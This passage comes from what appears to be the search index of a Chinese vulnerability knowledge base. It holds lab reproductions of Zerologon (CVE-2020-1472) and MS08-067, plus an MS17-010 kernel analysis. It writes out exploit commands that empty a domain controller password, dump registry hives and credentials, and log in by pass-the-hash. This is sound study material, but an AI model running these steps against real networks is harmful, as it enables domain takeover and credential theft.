#\u5982\u679c\u5acc\u5f03\u4e0b\u8f7d\u6162\u9879\u76ee\u4e0a\u6709\u4e0b\u8f7d\u597d\u7684\u89e3\u538b\u540e\u5373\u53ef\u7528 git clone --depth=1 https://github.com/SecureAuthCorp/impacket \u626b\u63cf\u811a\u672c \u8be5\u811a\u672c\u7528\u4e8e\u6d4b\u8bd5\u673a\u5668\u662f\u5426\u5b58\u5728\u6f0f\u6d1e #Usage: CVE-2020-1472_Scan.py dc-name dc-ip python3 CVE-2020-1472_Scan.py dc 192.168.183.171 \u5229\u7528\u811a\u672c \u8be5\u811a\u672c\u4f1a\u4f7f\u7528\u540e\u4f1a\u628a\u5bc6\u7801\u91cd\u7f6e\u4e3a\u7a7a\uff01\uff01\u4e71\u7528\u5bb9\u6613\u5bf9\u7167\u6210\u635f\u5931\uff01\uff01 #Usage: CVE-2020-1472_Exploit.py dc-name dc-ip python3 CVE-2020-1472_Exploit.py dc 192.168.183.171 \u63a5\u7740\u8fdb\u5165\u4e0b\u8f7d\u597d\u7684 impacket \u9879\u76ee\uff0c\u4f7f\u7528\u7a7a\u5bc6\u7801\u767b\u5f55 cd impacket / examples / #Usage: secretsdump.py dc / dc-name \\$@ dc-ip python3 secretsdump . py ascotbe . com / dc \\$ @192.168.183.171 - no - pass \u63a5\u7740\u5229\u7528hash\u8fdb\u884c\u767b\u5f55 #Usage: wmiexec.py -hashes user-hash dc / user-name @ dc-ip python3 wmiexec . py - hashes aad3b435b51404eeaad3b435b51404ee : 45280 efa2300182b4f7fdc2cee182149 ascotbe . com / administrator @192.168.183.171 \u8fd8\u539f\u5bc6\u7801 \u4fdd\u5b58\u5bc6\u7801\u540e\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u63a5\u7740\u5220\u9664\u57df\u63a7\u4e0a\u7684\u6587\u4ef6 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save get system.save get sam.save get security.save del system.save del sam.save del security.save \u63a5\u7740\u8fdb\u884c\u89e3\u5bc6 python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u53ef\u4ee5\u770b\u5230\u8fd9\u662f\u4e4b\u524d\u4fee\u6539\u4e4b\u524d\u7684\u5bc6\u7801\uff0c\u63a5\u7740\u56de\u5230\u684c\u9762\u4f7f\u7528\u811a\u672c\u6062\u590d\u5bc6\u7801 #Usage: CVE-2020-1472_RestoreOriginalPassword.py dc-name dc-ip dc-original-hash python3 CVE-2020-1472_RestoreOriginalPassword.py dc 192.168.183.171 d4ac5a73fd3f13dfd9d6de036a9e99a2 \u9879\u76ee\u6765\u6e90 \u626b\u63cf\u811a\u672c: SecuraBV \u5229\u7528\u811a\u672c: dirkjanm \u6062\u590d\u811a\u672c: risksense https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2020-1472","title":"CVE-2020-1472"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1472\uff09Windows Zerologon\u57df\u63d0\u6743\u6f0f\u6d1e/#cve-2020-1472","text":"","title":"CVE-2020-1472"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1472\uff09Windows Zerologon\u57df\u63d0\u6743\u6f0f\u6d1e/#_1","text":"\u653b\u51fb\u8005\u4f7f\u7528Netlogon\u8fdc\u7a0b\u534f\u8bae\uff08MS-NRPC\uff09\u5efa\u7acb\u4e0e\u57df\u63a7\u5236\u5668\u7684\u6613\u53d7\u653b\u51fb\u7684Netlogon\u5b89\u5168\u901a\u9053\u8fde\u63a5\u65f6\uff0c\u5c06\u5b58\u5728\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u8fdc\u7a0b\u4fee\u6539\u5bc6\u7801\u7b49\u64cd\u4f5c","title":"\u63cf\u8ff0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1472\uff09Windows Zerologon\u57df\u63d0\u6743\u6f0f\u6d1e/#_2","text":"Product Version Update Edition Tested Windows Server 2008 R2 for x64-based Systems Service Pack 1 \u2714\ufe0f Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) \u2714\ufe0f Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation)","title":"\u5f71\u54cd\u7248\u672c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1472\uff09Windows Zerologon\u57df\u63d0\u6743\u6f0f\u6d1e/#_3","text":"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472","title":"\u4fee\u590d\u8865\u4e01"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1472\uff09Windows Zerologon\u57df\u63d0\u6743\u6f0f\u6d1e/#_4","text":"\u6ce8\u610f\uff1aEXP\u811a\u672c\u4f1a\u91cd\u7f6e\u57df\u63a7\u673a\u5668\u7684\u5bc6\u7801\uff01\uff01\uff01\u4e0d\u8981\u778e\u9e21\u513f\u4e71\u7528\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01 \u6d4b\u8bd5\u673a\u5668Windows Server 2008 R2 SP1 X64 \uff0c\u5e76\u4e14\u8bbe\u7f6e\u73af\u5883\u4e3a\u57df\u63a7\u673a\u5668 \u7531\u4e0a\u56fe\u53ef\u77e5\uff1a \u57df\u4e3a- ascotbe.com \u8ba1\u7b97\u673a\u540d\u4e3a- dc \u57df\u63a7ip- 192.168.183.171 \u4f7f\u7528\u524d\u73af\u5883\u914d\u7f6e\uff0c\u9700\u8981Python3.7+\u7684\u7248\u672c\uff0c\u5982\u679c\u4e4b\u524d\u6709\u5b89\u88c5\u8fc7 impacket \u7684python\u5305\u7684\u8bdd\uff08\u6bd4\u5982kali\uff09\u9700\u8981\u5378\u8f7d\u4e86\u5728\u91cd\u65b0\u5b89\u88c5 0.9.21 \u8fd9\u4e2a\u7248\u672c\u7684\u5305\uff0c\u5feb\u6377\u8bed\u53e5 python3 -m pip install git+https://github.com/SecureAuthCorp/impacket \uff0c\u4e0b\u9762\u662f\u901a\u7528\u65b9\u6cd5 python3 -m pip install -r Kernelhub.txt #\u5982\u679c\u5acc\u5f03\u4e0b\u8f7d\u6162\u9879\u76ee\u4e0a\u6709\u4e0b\u8f7d\u597d\u7684\u89e3\u538b\u540e\u5373\u53ef\u7528 git clone --depth=1 https://github.com/SecureAuthCorp/impacket \u626b\u63cf\u811a\u672c \u8be5\u811a\u672c\u7528\u4e8e\u6d4b\u8bd5\u673a\u5668\u662f\u5426\u5b58\u5728\u6f0f\u6d1e #Usage: CVE-2020-1472_Scan.py dc-name dc-ip python3 CVE-2020-1472_Scan.py dc 192.168.183.171 \u5229\u7528\u811a\u672c \u8be5\u811a\u672c\u4f1a\u4f7f\u7528\u540e\u4f1a\u628a\u5bc6\u7801\u91cd\u7f6e\u4e3a\u7a7a\uff01\uff01\u4e71\u7528\u5bb9\u6613\u5bf9\u7167\u6210\u635f\u5931\uff01\uff01 #Usage: CVE-2020-1472_Exploit.py dc-name dc-ip python3 CVE-2020-1472_Exploit.py dc 192.168.183.171 \u63a5\u7740\u8fdb\u5165\u4e0b\u8f7d\u597d\u7684 impacket \u9879\u76ee\uff0c\u4f7f\u7528\u7a7a\u5bc6\u7801\u767b\u5f55 cd impacket / examples / #Usage: secretsdump.py dc / dc-name \\$@ dc-ip python3 secretsdump . py ascotbe . com / dc \\$ @192.168.183.171 - no - pass \u63a5\u7740\u5229\u7528hash\u8fdb\u884c\u767b\u5f55 #Usage: wmiexec.py -hashes user-hash dc / user-name @ dc-ip python3 wmiexec . py - hashes aad3b435b51404eeaad3b435b51404ee : 45280 efa2300182b4f7fdc2cee182149 ascotbe . com / administrator @192.168.183.171 \u8fd8\u539f\u5bc6\u7801 \u4fdd\u5b58\u5bc6\u7801\u540e\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u63a5\u7740\u5220\u9664\u57df\u63a7\u4e0a\u7684\u6587\u4ef6 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save get system.save get sam.save get security.save del system.save del sam.save del security.save \u63a5\u7740\u8fdb\u884c\u89e3\u5bc6 python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u53ef\u4ee5\u770b\u5230\u8fd9\u662f\u4e4b\u524d\u4fee\u6539\u4e4b\u524d\u7684\u5bc6\u7801\uff0c\u63a5\u7740\u56de\u5230\u684c\u9762\u4f7f\u7528\u811a\u672c\u6062\u590d\u5bc6\u7801 #Usage: CVE-2020-1472_RestoreOriginalPassword.py dc-name dc-ip dc-original-hash python3 CVE-2020-1472_RestoreOriginalPassword.py dc 192.168.183.171 d4ac5a73fd3f13dfd9d6de036a9e99a2","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1472\uff09Windows Zerologon\u57df\u63d0\u6743\u6f0f\u6d1e/#_5","text":"\u626b\u63cf\u811a\u672c: SecuraBV \u5229\u7528\u811a\u672c: dirkjanm \u6062\u590d\u811a\u672c: risksense https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2020-1472","title":"\u9879\u76ee\u6765\u6e90"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/","text":"\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e \u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb CVE-2008-4250\u5fae\u8f6f\u7f16\u53f7\u4e3aMS08-067\uff0c\u6839\u636e\u5fae\u8f6f\u5b89\u5168\u6f0f\u6d1e\u516c\u544a\uff0c\u57fa\u672c\u53ef\u4ee5\u4e86\u89e3\u5176\u539f\u7406\uff1a\\ MS08-067\u6f0f\u6d1e\u662f\u901a\u8fc7MSRPC over SMB\u901a\u9053\u8c03\u7528Server\u670d\u52a1\u7a0b\u5e8f\u4e2d\u7684NetPathCanonicalize\u51fd\u6570\u65f6\u89e6\u53d1\u7684\uff0c\u800cNetPathCanonicalize\u51fd\u6570\u5728\u8fdc\u7a0b\u8bbf\u95ee\u5176\u4ed6\u4e3b\u673a\u65f6\uff0c\u4f1a\u8c03\u7528NetpwPathCanonicalize\u51fd\u6570\uff0c\u5bf9\u8fdc\u7a0b\u8bbf\u95ee\u7684\u8def\u5f84\u8fdb\u884c\u89c4\u8303\u5316\uff08\u5c06\u8def\u5f84\u5b57\u7b26\u4e32\u4e2d\u7684\\'/\\'\u8f6c\u6362\u4e3a\\'\\',\u540c\u65f6\u53bb\u9664\u76f8\u5bf9\u8def\u5f84\\\".\\\"\u548c\\\"..\\\"\uff09\uff0c\u800c\u5728NetpwPathCanonicalize\u51fd\u6570\u4e2d\u53d1\u751f\u4e86\u6808\u7f13\u51b2\u533a\u5185\u5b58\u9519\u8bef\uff0c\u9020\u6210\u53ef\u88ab\u5229\u7528\u5b9e\u65bd\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd Windows 2000;XP;Server 2003;Server 2008;7 Beta \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b nmap -p 445 --script=smb-vuln-ms08-067 192.168.75.133 \\ \u4f7f\u7528msf\uff0c\u8fdb\u5165ms08-067\u5229\u7528\u6a21\u5757 \u914d\u7f6e\u8bbe\u7f6e\u4e3a\u5982\u4e0b run \u8fd0\u884c \u6210\u529f\u83b7\u5f97session \u8e29\u5751\uff08\u4e00\uff09\u8fde\u63a5\u62d2\u7edd [ - ] 192.168.48.151 : 445 - Exploit failed [ unreachable ] : Rex : : ConnectionRefused The connection was refused by the remote host ( 192.168.48.151 : 445 ). \u5f00\u542fWindows XP \u7684445\u7aef\u53e3\u548cServer\u670d\u52a1 \u8e29\u5751\uff08\u4e8c\uff09\u767b\u5f55\u5931\u8d25 [-] 192.168.48.151:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0) \u9996\u5148\u68c0\u6d4bSMBPass\u7684\u503c\u662f\u5426\u6b63\u786e Win + R\u6253\u5f00gpedit.msc \u4f9d\u6b21\u6253\u5f00 \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565 - >\u8ba1\u7b97\u673a\u914d\u7f6e - > Windows\u8bbe\u7f6e - >\u5b89\u5168\u8bbe\u7f6e - >\u672c\u5730\u7b56\u7565 - >\u5b89\u5168\u9009\u9879 \u4fee\u6539\u7f51\u7edc\u8bbf\u95ee\uff1a\u672c\u5730\u5e10\u6237\u7684\u5171\u4eab\u548c\u5b89\u5168\u6a21\u5f0f\u4e3a\u7ecf\u5178 - \u672c\u5730\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1 \u8e29\u5751\uff08\u4e09\uff09\u5171\u4eab\u670d\u52a1\u4e0d\u5141\u8bb8\u8fdc\u7a0b\u8bbf\u95ee \u8f83\u65b0\u7684Windows\u7cfb\u7edf\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u4e0d\u5141\u8bb8\u7684 [-] 192.168.48.144:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0) \u5c06\u6ce8\u518c\u8868\u4e2dLocalAccountTokenFilterPolicy\u7684\u503c\u66f4\u6539\u4e3a1 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \u5982\u679c\u4e0b\u9762\u6ca1\u6709\u8be5\u6587\u4ef6\uff0c\u76f4\u63a5\u65b0\u5efa\u4e00\u4e2a\uff08DWORD32\u4f4d\uff09","title":"\uff08CVE 2008 4250\uff09\u3010MS08 067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#cve-2008-4250ms08-067windows","text":"","title":"\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_1","text":"CVE-2008-4250\u5fae\u8f6f\u7f16\u53f7\u4e3aMS08-067\uff0c\u6839\u636e\u5fae\u8f6f\u5b89\u5168\u6f0f\u6d1e\u516c\u544a\uff0c\u57fa\u672c\u53ef\u4ee5\u4e86\u89e3\u5176\u539f\u7406\uff1a\\ MS08-067\u6f0f\u6d1e\u662f\u901a\u8fc7MSRPC over SMB\u901a\u9053\u8c03\u7528Server\u670d\u52a1\u7a0b\u5e8f\u4e2d\u7684NetPathCanonicalize\u51fd\u6570\u65f6\u89e6\u53d1\u7684\uff0c\u800cNetPathCanonicalize\u51fd\u6570\u5728\u8fdc\u7a0b\u8bbf\u95ee\u5176\u4ed6\u4e3b\u673a\u65f6\uff0c\u4f1a\u8c03\u7528NetpwPathCanonicalize\u51fd\u6570\uff0c\u5bf9\u8fdc\u7a0b\u8bbf\u95ee\u7684\u8def\u5f84\u8fdb\u884c\u89c4\u8303\u5316\uff08\u5c06\u8def\u5f84\u5b57\u7b26\u4e32\u4e2d\u7684\\'/\\'\u8f6c\u6362\u4e3a\\'\\',\u540c\u65f6\u53bb\u9664\u76f8\u5bf9\u8def\u5f84\\\".\\\"\u548c\\\"..\\\"\uff09\uff0c\u800c\u5728NetpwPathCanonicalize\u51fd\u6570\u4e2d\u53d1\u751f\u4e86\u6808\u7f13\u51b2\u533a\u5185\u5b58\u9519\u8bef\uff0c\u9020\u6210\u53ef\u88ab\u5229\u7528\u5b9e\u65bd\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_2","text":"Windows 2000;XP;Server 2003;Server 2008;7 Beta","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_3","text":"nmap -p 445 --script=smb-vuln-ms08-067 192.168.75.133 \\ \u4f7f\u7528msf\uff0c\u8fdb\u5165ms08-067\u5229\u7528\u6a21\u5757 \u914d\u7f6e\u8bbe\u7f6e\u4e3a\u5982\u4e0b run \u8fd0\u884c \u6210\u529f\u83b7\u5f97session","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_4","text":"[ - ] 192.168.48.151 : 445 - Exploit failed [ unreachable ] : Rex : : ConnectionRefused The connection was refused by the remote host ( 192.168.48.151 : 445 ). \u5f00\u542fWindows XP \u7684445\u7aef\u53e3\u548cServer\u670d\u52a1","title":"\u8e29\u5751\uff08\u4e00\uff09\u8fde\u63a5\u62d2\u7edd"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_5","text":"[-] 192.168.48.151:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0) \u9996\u5148\u68c0\u6d4bSMBPass\u7684\u503c\u662f\u5426\u6b63\u786e Win + R\u6253\u5f00gpedit.msc \u4f9d\u6b21\u6253\u5f00 \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565 - >\u8ba1\u7b97\u673a\u914d\u7f6e - > Windows\u8bbe\u7f6e - >\u5b89\u5168\u8bbe\u7f6e - >\u672c\u5730\u7b56\u7565 - >\u5b89\u5168\u9009\u9879 \u4fee\u6539\u7f51\u7edc\u8bbf\u95ee\uff1a\u672c\u5730\u5e10\u6237\u7684\u5171\u4eab\u548c\u5b89\u5168\u6a21\u5f0f\u4e3a\u7ecf\u5178 - \u672c\u5730\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1","title":"\u8e29\u5751\uff08\u4e8c\uff09\u767b\u5f55\u5931\u8d25"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2008-4250\uff09\u3010MS08-067\u3011Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_6","text":"\u8f83\u65b0\u7684Windows\u7cfb\u7edf\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u4e0d\u5141\u8bb8\u7684 [-] 192.168.48.144:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0) \u5c06\u6ce8\u518c\u8868\u4e2dLocalAccountTokenFilterPolicy\u7684\u503c\u66f4\u6539\u4e3a1 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \u5982\u679c\u4e0b\u9762\u6ca1\u6709\u8be5\u6587\u4ef6\uff0c\u76f4\u63a5\u65b0\u5efa\u4e00\u4e2a\uff08DWORD32\u4f4d\uff09","title":"\u8e29\u5751\uff08\u4e09\uff09\u5171\u4eab\u670d\u52a1\u4e0d\u5141\u8bb8\u8fdc\u7a0b\u8bbf\u95ee"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/","text":"\uff08CVE-2017-0143\uff0cCVE-2017-0144\uff0cCVE-2017-0145\uff0cCVE-2017-0146\uff0cCVE-2017-0147\uff0cCVE-2017-0148\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e \u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u200b MS17-010\uff08\u6c38\u6052\u4e4b\u84dd\uff09\u5e94\u7528\u7684\u4e0d\u4ec5\u4ec5\u662f\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u800c\u662f\u5305\u542bWindows SMB \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2017-0143\u3001CVE-2017-0144\u3001CVE-2017-0145\u3001CVE-2017-0146\u3001CVE-2017-0147\u3001CVE-2017-0148\u5728\u5185\u76846\u4e2aSMB\u6f0f\u6d1e\u7684\u653b\u51fb\u3002 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u200b \u76ee\u524d\u5df2\u77e5\u53d7\u5f71\u54cd\u7684 Windows \u7248\u672c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aWindows NT\uff0cWindows 2000\u3001Windows XP\u3001Windows 2003\u3001Windows Vista\u3001Windows 7\u3001Windows 8\uff0cWindows 2008\u3001Windows 2008 R2\u3001Windows Server 2012 SP0\u3002 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u6f0f\u6d1e\u5206\u6790 0x01 \u5148\u5173\u6ce8MS17-010\u4e2d\u4f7f\u7528\u7684\u4e09\u4e2a\u5173\u952e\u6f0f\u6d1e \u7b2c\u4e00\u4e2a\uff1a\u6f0f\u6d1e\u5373Fea list\u8f6c\u6362NT Fea list\u89e6\u53d1\u7684overflow\uff1b\u901a\u8fc7srv buff\u5bf9\u8c61\u8986\u76d6\u4e86\u540e\u7eed\u7684srvnet buff\u7684\u7ed3\u6784\u4f53 \u95ee\u9898\u51fa\u73b0\u518dSrvOs2FeaListSizeToNt \u51fd\u6570\u4e2d\uff0c\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a unsigned int __fastcall SrvOs2FeaListSizeToNt ( int pOs2Fea ) { unsigned int v1 ; // edi@1 int Length ; // ebx@1 int pBody ; // esi@1 unsigned int v4 ; // ebx@1 int v5 ; // ecx@3 int v8 ; // [sp+10h] [bp-8h]@3 unsigned int v9 ; // [sp+14h] [bp-4h]@1 v1 = 0 ; Length = * ( _DWORD * ) pOs2Fea ; // \u8fd9\u91cc\u4ee5DWORD\u7c7b\u578b\u83b7\u53d6length pBody = pOs2Fea + 4 ; v9 = 0 ; v4 = pOs2Fea + Length ; while ( pBody lt ; v4 ) { if ( pBody + 4 gt ; = v4 || ( v5 = * ( _BYTE * )( pBody + 1 ) + * ( _WORD * )( pBody + 2 ), v8 = * ( _BYTE * )( pBody + 1 ) + * ( _WORD * )( pBody + 2 ), v5 + pBody + 5 gt ; v4 ) ) { // \u8fd9\u91cc\u4ee5WORD\u66f4\u65b0length\u7684\u4f4e\u4f4d2\u5b57\u8282 // \u521d\u59cb\u503c\u662f0x10000,\u6700\u7ec8\u53d8\u6210\u4e860x1ff7E * ( _WORD * ) pOs2Fea = pBody - pOs2Fea ; return v1 ; // \u8fd9\u91cc\u8fd4\u56de\u7684\u5927\u5c0f\u4e3a\u540e\u7eed\u7528\u4e8e\u5185\u5b58\u7533\u8bf7 } if ( RtlULongAdd ( v1 , ( v5 + 0xC ) amp ; 0xFFFFFFFC , amp ; v9 ) lt ; 0 ) return 0 ; v1 = v9 ; pBody += v8 + 5 ; } return v1 ; } \u4f7f\u7528windbg\u6765\u52a8\u6001\u8c03\u8bd5\uff0c\u5148\u67e5\u8be2SrvOs2FeaListToNt\u4e2d SrvOs2FeaListSizeToNt \u8c03\u7528\u7684\u7ed3\u679c\uff1a kd gt ; p srv ! SrvOs2FeaListToNt + 0 x15 : a6f7a57a 8 b7510 mov esi , dword ptr [ ebp + 10 h ] kd gt ; r eax = 00010 fe8 ebx = 884241 e0 ecx = 837 a70ea edx = 0000008 f esi = 83797008 edi = 837970 d8 eip = a6f7a57a esp = 90 b2bb70 ebp = 90 b2bb7c iopl = 0 nv up ei pl nz ac pe nc cs = 0008 ss = 0010 ds = 0023 es = 0023 fs = 0030 gs = 0000 efl = 00000216 srv ! SrvOs2FeaListToNt + 0 x15 : a6f7a57a 8 b7510 mov esi , dword ptr [ ebp + 10 h ] ss : 0010 : 90 b2bb8c = 90 b2bba8 # \u65ad\u70b9 bp srv ! SrvOs2FeaListToNt + 0 x10 bp srv ! SrvOs2FeaListToNt + 0 x33 \u6b64\u65f6\u83b7\u53d6\u5230\u7684\u5927\u5c0f\u4e3a0x10fe8\uff0c\u540e\u7eed\u53d8\u66f4\u8be5\u503c\u8fdb\u884c\u5185\u5b58\u7533\u8bf7(\u51cf\u53bb9\u5b57\u8282) srv ! SrvOs2FeaListSizeToNt + 0X5E 96759506 2 bf0 sub esi , eax 96759508 668930 mov word ptr [ eax ] , si # \u8fd9\u91cc\u66f4\u65b0size\u4ee5WORD\u7c7b\u578b \u8c03\u8bd5\u4e2d\u53ef\u4ee5\u770b\u5230\u5bf9\u5e94\u7684size\u5927\u5c0f kd gt ; r eax = a381b0d8 ebx = 0000008 f ecx = a382b0ea edx = 0000008 f esi = 0000 ff7e edi = a382b0d8 eip = 96759508 esp = 8 ca43b54 ebp = 8 ca43b64 iopl = 0 nv up ei pl nz ac pe nc cs = 0008 ss = 0010 ds = 0023 es = 0023 fs = 0030 gs = 0000 efl = 00000216 srv ! SrvOs2FeaListSizeToNt + 0x60 : 96759508 668930 mov word ptr [ eax ] , si ds : 0023 : a381b0d8 = 0000 si\u4e3a: 0xff7e, \u5728SrvOs2FeaListToNt\u51fd\u6570\u4e2d\u83b7\u53d6\u5230size\u503c\u540e\u4f1a\u5f15\u7528\u8be5\u503c\u8bbe\u7f6e\u8fb9\u754c\u503c\uff0c\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a unsigned int __fastcall SrvOs2FeaListToNt ( int pOs2Fea , int * pArgNtFea , int * a3 , _WORD * a4 ) { __int16 v5 ; // bx@1 unsigned int Size ; // eax@1 NTFEA * pNtFea ; // ecx@3 int pOs2FeaBody ; // esi@9 int v10 ; // edx@9 unsigned int v11 ; // esi@14 int v12 ; // [sp+Ch] [bp-Ch]@11 unsigned int v14 ; // [sp+20h] [bp+8h]@9 v5 = 0 ; Size = SrvOs2FeaListSizeToNt ( pOs2Fea ); // \u83b7\u53d6\u7684\u5927\u5c0f\u4e3a0x10fe8 * a3 = Size ; if ( ! Size ) { * a4 = 0 ; return 0xC098F0FF ; } pNtFea = ( NTFEA * ) SrvAllocateNonPagedPool ( Size , 0x15 ); // \u5185\u5b58\u7533\u8bf7 * pArgNtFea = ( int ) pNtFea ; if ( pNtFea ) { pOs2FeaBody = pOs2Fea + 4 ; // \u540e\u7eed\u5f15\u7528\u8be5\u503c\u4e3a\u904d\u5386\u7684\u8d77\u59cb\u5730\u5740 v10 = ( int ) pNtFea ; v14 = pOs2Fea + * ( _DWORD * ) pOs2Fea - 5 ; // \u8fd9\u91cc\u8bbe\u7f6e\u8fb9\u754c\u5730\u5740size-5 if ( pOs2Fea + 4 gt ; v14 ) { LABEL_13 : if ( pOs2FeaBody == pOs2Fea + * ( _DWORD * ) pOs2Fea ) { * ( _DWORD * ) v10 = 0 ; return 0 ; } v11 = 0xC0000001 ; * a4 = v5 - pOs2Fea ; } else { while ( ! ( * ( _BYTE * ) pOs2FeaBody amp ; 0x7F ) ) { v12 = ( int ) pNtFea ; v5 = pOs2FeaBody ; // \u8d77\u59cb\u5730\u5740 pNtFea = ( NTFEA * ) SrvOs2FeaToNt ( pNtFea , pOs2FeaBody ); // memmove\u89e6\u53d1 pOs2FeaBody += * ( _BYTE * )( pOs2FeaBody + 1 ) + * ( _WORD * )( pOs2FeaBody + 2 ) + 5 ; // \u76ee\u6807\u5730\u5740pNtFea\u7684\u5927\u5c0f\u4e3a\uff1a0x10fe8 // 